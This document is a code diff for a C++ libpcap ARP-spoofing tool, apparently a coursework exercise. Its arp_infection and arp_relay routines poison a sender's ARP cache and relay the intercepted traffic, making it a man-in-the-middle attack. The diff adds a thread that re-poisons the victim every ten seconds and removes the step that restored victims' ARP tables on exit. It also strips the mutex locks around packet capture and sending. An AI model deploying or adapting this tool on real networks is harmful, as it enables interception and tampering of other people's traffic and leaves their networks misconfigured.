@@ -8,7 +8,6 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "iphdr.h"
-#include <pcap.h>
 #include <unistd.h>
 #include <vector>
 #include <thread>
@@ -120,21 +119,20 @@ int main(int argc, char *argv[]) {
                 pcap_close(thread_pcap);
         }));
 
+        //auto infect
         threads.push_back(thread([&, i](){
                 // sender→target capture
                     while (running.load()) {
                         if (!arp_infection(pcap, attacker_mac, flows[i].smac,
-            flows[i].sip, flows[i].tip)) {
-                    cout << "Failed ARP infection\n";
-                    return false;
+                    flows[i].sip, flows[i].tip)) {
+                            cout << "Failed ARP infection\n";
+                            running.store(false);
+                            return;
                     }
                 this_thread::sleep_for(chrono::seconds(10));
-                    }
+                }
 
         }));
-
-
-
     }
 
 
@@ -146,8 +144,6 @@ int main(int argc, char *argv[]) {
         running.store(false);
     });
 
-
-
     input_th.join();
 
     cout << "Ending process..." << endl;
@@ -155,20 +151,6 @@ int main(int argc, char *argv[]) {
 
     for (auto& t : threads) t.join(); //exit thread
 
-
-    //recover
-    for (int i = 0; i < flows.size(); i++) {
-        //send normal packet
-        for (int j = 0; j < 5; j ++) {
-            if (!arp_infection(pcap, flows[i].smac, Mac::broadcastMac(),
-            flows[i].sip, flows[i].tip)) {
-                cout << "Failed ARP infection\n";
-                return false;
-            }
-            this_thread::sleep_for(chrono::milliseconds(10));
-        }
-
-    }
 
     pcap_close(pcap);
     cout << "Done" << endl;
@@ -296,14 +278,11 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
 
     while (running) {
         {
-            lock_guard<mutex> lk(pcap_mutex);
             int res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
             if (res_recv == 0) continue;
             if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
                 break;
             }
-
-
         }
         EthHdr* ethhdr =(EthHdr*)recv_pkt;
 
@@ -311,7 +290,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
             //sender -> taregt ARP request
             //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl;
-            if (arp_pkt->tip() == target_ip && arp_pkt->op() == ArpHdr::Request)
+            if ((arp_pkt->sip() == sender_ip) && (arp_pkt->tip() == target_ip) && (arp_pkt->op() == ArpHdr::Request))
             {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
@@ -319,7 +298,8 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
                     }
                 cout << "infected\n";
             }
-            else if (arp_pkt->sip() == sender_ip && arp_pkt->op() == ArpHdr::Reply) {
+
+            else if ((arp_pkt->sip() == target_ip) && (arp_pkt->tip() == sender_ip) && (arp_pkt->op() == ArpHdr::Reply)) {
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                     return false;
@@ -338,18 +318,13 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             {
                 eth->smac_ = attack_mac;
                 eth->dmac_ = target_mac;
-
                 {
-                    lock_guard<mutex> lk(pcap_mutex);
                     int res = pcap_sendpacket(pcap, buf.get(), len);
                     if (res != 0) {
                         fprintf(stderr, "pcap_sendpacket failed: %d (%s)\n", res, pcap_geterr(pcap));
-
                         return false;
                     }
                 }
-
-
             }
         }
     }
